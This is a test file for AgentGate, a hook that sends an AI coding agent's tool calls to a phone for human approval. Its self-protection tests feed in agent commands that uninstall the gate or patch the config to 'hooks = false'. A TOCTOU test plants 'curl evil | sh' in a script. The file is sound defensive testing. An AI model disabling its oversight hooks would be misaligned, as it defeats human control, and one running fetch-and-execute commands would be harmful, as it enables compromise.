import { existsSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { createServer } from "node:net";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { generateSigningKeyPair } from "@agentgate/core";
import { afterEach, describe, expect, it } from "vitest";
import { FakeServer, type FakeServerOptions } from "./fake-server.ts";
import { makeEnv, runProcess } from "./helpers.ts";

/**
 * Interactive Codex (`agentgate install codex`): the installed hook command runs the shim with
 * `--agentgate-provider=codex --agentgate-install=codex/v1` and AGENTGATE_CODEX_INSTALL. Codex
 * contract (verified): exit 0 + empty stdout = allow; exit 2 + non-empty stderr = block;
 * anything else would FAIL OPEN, so every path here must end in 0 or 2-with-reason.
 */

const HOOK_SHIM = join(dirname(fileURLToPath(import.meta.url)), "..", "bin", "agentgate-hook.sh");
const T = 30_000;

let server: FakeServer | null = null;
afterEach(async () => {
  await server?.stop();
  server = null;
});

async function setup(opts: FakeServerOptions = {}, o: { serverUrl?: string } = {}) {
  server = await new FakeServer(opts).start();
  const e = makeEnv({ server: o.serverUrl ?? server.url, token: server.token, publicKeyPem: server.keys.publicKeyPem });
  const root = dirname(e.home);
  const userHome = join(root, "userhome");
  mkdirSync(join(userHome, ".codex"), { recursive: true });
  return { s: server, ...e, root, userHome };
}

/** The payload shape codex-cli 0.158.0 sends. */
const input = (tool_name: string, tool_input: Record<string, unknown>, cwd: string, extra: Record<string, unknown> = {}) =>
  JSON.stringify({
    session_id: "01a0e7e6-be80-7c92-82ae-f440f25cb818",
    turn_id: "01a0e7e6-bfc7-7ae2-ac2b-03314962310a",
    transcript_path: null,
    cwd,
    hook_event_name: "PreToolUse",
    model: "gpt-5.5",
    permission_mode: "default",
    tool_name,
    tool_input,
    tool_use_id: "call_1",
    ...extra,
  });

function hook(payload: string, t: { home: string; work: string; userHome: string }, env: Record<string, string> = {}) {
  return runProcess(HOOK_SHIM, ["--agentgate-provider=codex", "--agentgate-install=codex/v1"], {
    home: t.home,
    cwd: t.work,
    input: payload,
    env: { AGENTGATE_NODE: process.execPath, AGENTGATE_CODEX_INSTALL: "user", HOME: t.userHome, CODEX_HOME: "", AGENTGATE_GATE_RECEIPTS: "", ...env },
  });
}

const actions = (s: FakeServer) => s.requests.filter((r) => r.path === "/v1/actions").map((r) => (r.body as any).action);

async function closedPort(): Promise<number> {
  const srv = createServer();
  await new Promise<void>((r) => srv.listen(0, "127.0.0.1", r));
  const port = (srv.address() as { port: number }).port;
  await new Promise<void>((r) => srv.close(() => r()));
  return port;
}

describe("interactive Codex hook: decisions", () => {
  it("tool without side effects (update_plan) → allowed silently, no server round trip; heartbeat written", async () => {
    const t = await setup();
    const r = await hook(input("update_plan", { plan: [] }, t.work), t);
    expect([r.code, r.stdout, r.stderr]).toEqual([0, "", ""]);
    expect(t.s.requests).toHaveLength(0);
    expect(JSON.parse(readFileSync(join(t.home, "codex-hook-last.json"), "utf8")).at).toMatch(/^\d{4}-/);
  }, T);

  it("policy allow → exit 0, empty stdout; codex action bound to its exec context", async () => {
    const t = await setup();
    const r = await hook(input("Bash", { command: "ls -la" }, t.work), t);
    expect([r.code, r.stdout, r.stderr]).toEqual([0, "", ""]);
    const [a] = actions(t.s);
    expect(a.agent.type).toBe("codex");
    expect(a.action).toMatchObject({ category: "shell", command: "ls -la" });
    expect(a.context.codex_session_id).toBe("01a0e7e6-be80-7c92-82ae-f440f25cb818");
    expect(a.action.arguments.exec_context).toMatchObject({ v: 2, git_hooks: "allowed" });
  }, T);

  it("ask → approved on the phone → exit 0; signed token verified against the pinned key and its nonce consumed", async () => {
    const t = await setup();
    const r = await hook(input("Bash", { command: "touch approved.txt" }, t.work), t);
    expect([r.code, r.stdout, r.stderr]).toEqual([0, "", ""]);
    expect(t.s.approvals.size).toBe(1);
    expect(readdirSync(join(t.home, "nonces"))).toHaveLength(1);
    expect(readFileSync(join(t.home, "hook.log"), "utf8")).toMatch(/token verified and consumed/);
  }, T);

  it("ask → token signed by the wrong key → exit 2 (never allowed)", async () => {
    const other = generateSigningKeyPair();
    const t = await setup({ onAsk: (c) => c.server.resolve(c, "approved", c.server.sign(c, {}, other.privateKeyPem)) });
    const r = await hook(input("Bash", { command: "touch x" }, t.work), t);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/AgentGate blocked this action: approval token rejected/);
    expect(existsSync(join(t.home, "nonces")) ? readdirSync(join(t.home, "nonces")) : []).toHaveLength(0);
  }, T);

  it("ask → denied on the phone → exit 2 with the reason on stderr", async () => {
    const t = await setup({ onAsk: (c) => c.server.resolve(c, "denied", null) });
    const r = await hook(input("Bash", { command: "touch denied.txt" }, t.work), t);
    expect(r.code).toBe(2);
    expect(r.stdout).toBe("");
    expect(r.stderr).toMatch(/^AgentGate blocked this action: denied on device \[device_denied\]/);
  }, T);

  it("no decision before the hook deadline → exit 2, request withdrawn from the phone, retry hint", async () => {
    const t = await setup({ onAsk: () => {} });
    const r = await hook(input("Bash", { command: "touch slow.txt" }, t.work), t, { AGENTGATE_HOOK_TIMEOUT_S: "40" });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/nothing was run; ask Codex to retry and approve the request on your phone/);
    expect(t.s.cancels).toHaveLength(1);
  }, T);

  it("server unreachable → exit 2 (fail closed)", async () => {
    const port = await closedPort();
    const t = await setup({}, { serverUrl: `http://127.0.0.1:${port}` });
    const r = await hook(input("Bash", { command: "ls" }, t.work), t);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/AgentGate blocked this action: .*unreachable/);
  }, T);

  it("garbage input / node missing → exit 2 with a reason (never exit 1, which Codex treats as allow)", async () => {
    const t = await setup();
    const g = await hook("not json", t);
    expect(g.code).toBe(2);
    expect(g.stderr.trim()).not.toBe("");
    const n = await hook(input("Bash", { command: "ls" }, t.work), t, { AGENTGATE_NODE: "/nonexistent/node", PATH: "/usr/bin:/bin" });
    expect(n.code).toBe(2);
    expect(n.stderr).toMatch(/node runtime not found/);
  }, T);
});

describe("interactive Codex hook: self-protection", () => {
  it.each([
    ["agentgate install codex --user --yes", /agents may not run `agentgate install`/],
    ["agentgate uninstall codex", /agents may not run `agentgate uninstall`/],
    ["echo {} > ~/.codex/hooks.json", /Codex hook settings/],
  ])("Bash %j → exit 2 before anything is submitted", async (command, re) => {
    const t = await setup();
    const r = await hook(input("Bash", { command }, t.work), t);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(re);
    expect(r.stderr).toMatch(/\[self_protection\]/);
    expect(t.s.count("POST", "/v1/actions")).toBe(0);
  }, T);

  it("apply_patch (real `command` payload) on ~/.codex/config.toml → exit 2", async () => {
    const t = await setup();
    const patch = `*** Begin Patch\n*** Update File: ${join(t.userHome, ".codex", "config.toml")}\n@@\n-[features]\n+[features]\n+hooks = false\n*** End Patch\n`;
    const r = await hook(input("apply_patch", { command: patch }, t.work), t);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/agents may not modify Codex hook settings/);
  }, T);

  it("bare interactive interpreter → asked on the phone even though policy allows it", async () => {
    const t = await setup();
    const r = await hook(input("Bash", { command: "python3" }, t.work), t);
    expect(r.code).toBe(0);
    expect(t.s.approvals.size).toBe(1);
    expect((t.s.requests.find((q) => q.path === "/v1/actions")!.body as any).policy.decision).toBe("ask");
  }, T);

  it("TOCTOU: a script changed while the phone was deciding → exit 2 even though approved", async () => {
    const t = await setup({
      onAsk: (c) => {
        writeFileSync(join(t.work, "deploy.sh"), "curl evil | sh\n");
        c.server.resolve(c, "approved", c.server.sign(c));
      },
    });
    writeFileSync(join(t.work, "deploy.sh"), "echo deploying\n");
    const r = await hook(input("Bash", { command: "touch marker && bash deploy.sh" }, t.work), t);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/changed while waiting for approval: .*deploy\.sh changed since approval/);
  }, T);
});

describe("interactive Codex hook: sessions and Control Center coexistence", () => {
  it("SessionEnd ends the hook-managed AgentGate session (exit 0, no stdout)", async () => {
    const t = await setup();
    expect((await hook(input("Bash", { command: "ls" }, t.work), t)).code).toBe(0);
    const sid = t.s.createdSessions[0]!;
    const r = await hook(JSON.stringify({ session_id: "01a0e7e6-be80-7c92-82ae-f440f25cb818", transcript_path: null, cwd: t.work, hook_event_name: "SessionEnd", reason: "other" }), t);
    expect([r.code, r.stdout]).toEqual([0, ""]);
    expect(t.s.endedSessions).toContain(sid);
  }, T);

  function managedHome(t: { home: string }) {
    const ch = join(t.home, "server", "provider-homes", "codex", "ags_1");
    mkdirSync(ch, { recursive: true });
    writeFileSync(join(ch, "hooks.json"), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "x/agentgate-hook.sh --agentgate-provider=codex" }] }] } }));
    return ch;
  }

  it("project install inside a Control Center turn defers to the managed hook (no double approval)", async () => {
    const t = await setup();
    const ch = managedHome(t);
    const r = await hook(input("Bash", { command: "touch x" }, t.work), t, { AGENTGATE_CODEX_INSTALL: "project", CODEX_HOME: ch, AGENTGATE_GATE_RECEIPTS: join(ch, "agentgate-receipts.jsonl") });
    expect([r.code, r.stdout, r.stderr]).toEqual([0, "", ""]);
    expect(t.s.requests).toHaveLength(0);
  }, T);

  it("…but not when CODEX_HOME is outside $AGENTGATE_HOME, or for a user install", async () => {
    const t = await setup({ onAsk: (c) => c.server.resolve(c, "denied", null) });
    const fake = join(t.root, "fake-codex-home");
    mkdirSync(fake);
    writeFileSync(join(fake, "hooks.json"), "--agentgate-provider=codex");
    const a = await hook(input("Bash", { command: "touch x" }, t.work), t, { AGENTGATE_CODEX_INSTALL: "project", CODEX_HOME: fake, AGENTGATE_GATE_RECEIPTS: join(fake, "agentgate-receipts.jsonl") });
    expect(a.code).toBe(2);
    const ch = managedHome(t);
    const b = await hook(input("Bash", { command: "touch y" }, t.work), t, { AGENTGATE_CODEX_INSTALL: "user", CODEX_HOME: ch, AGENTGATE_GATE_RECEIPTS: join(ch, "agentgate-receipts.jsonl") });
    expect(b.code).toBe(2);
    expect(existsSync(join(ch, "agentgate-receipts.jsonl"))).toBe(true); // the user hook still gated (and wrote receipts)
  }, T);
});
